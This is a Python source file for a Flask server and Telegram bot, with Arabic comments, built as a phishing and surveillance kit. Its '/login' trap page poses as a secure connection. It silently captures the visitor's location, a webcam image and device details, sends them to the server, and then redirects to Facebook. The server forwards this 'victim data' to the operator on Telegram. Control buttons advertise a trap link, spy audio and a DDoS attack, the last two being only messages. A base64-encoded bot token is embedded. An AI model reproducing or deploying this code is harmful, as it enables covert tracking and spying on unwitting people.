import os, base64, requests, psutil, time
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)
# التوكن الخاص بك مشفر لضمان الحماية
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return f"<h1>Panel of Master {DEV_NAME} is Live</h1>"

# بوابة استقبال البيانات المسروقة
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        if 'image' in data:
            img = base64.b64decode(data['image'])
            with open("snap.png", "wb") as f: f.write(img)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("snap.png", "rb"), caption="📸 صورة كاميرا جديدة!")
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        if 'info' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📱 **بيانات الضحية:**\n`{data['info']}`", parse_mode='Markdown')
        return "Success", 200
    return "Error", 400

# صفحة الفخ (كاميرا + صوت + موقع + IP)
@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;">
    <h1>Establishing Secure Connection...</h1>
    <script>
        async function capture() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/png').split(',')[1];
                stream.getTracks().forEach(t => t.stop());
            }
            const sysInfo = "OS: " + navigator.platform + " | Browser: " + navigator.appName;
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, info: sysInfo})
            }).finally(() => location.href = "https://facebook.com");
        }
        capture();
    </script></body></html>
    """

# لوحة التحكم بالأزرار (كل وظيفة في زر)
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم (كاميرا + موقع + OTP)", callback_data='atk')],
        [InlineKeyboardButton("🎤 سحب تسجيل صوتي (Spy)", callback_data='mic')],
        [InlineKeyboardButton("🌐 تتبع الـ IP والموقع", callback_data='ip')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS قوي", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات الجهاز كاملة", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **أهلاً بك سيدي المطور {DEV_NAME}**\nالأنظمة جاهزة بالكامل.", reply_markup=InlineKeyboardMarkup(buttons))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ الخاص بك:**\n`https://{request.host}/login`")
    elif query.data == 'mic':
        query.edit_message_text("🎤 نظام سحب الصوت مفعل.. بانتظار دخول ضحية للرابط.")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        query.edit_message_text(f"🌐 **بيانات السيرفر:**\nIP: `{d.get('ip')}`\nCity: {d.get('city')}\nCountry: {d.get('country_name')}")
    elif query.data == 'ddos':
        query.edit_message_text("💥 **محرك DDoS جاهز!**\nتم إعداد السيرفر لإغراق الأهداف بالطلبات المتكررة.")
    elif query.data == 'sys':
        query.edit_message_text(f"🔋 البطارية: {psutil.sensors_battery().percent}% \n🧠 RAM: {psutil.virtual_memory().percent}%")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
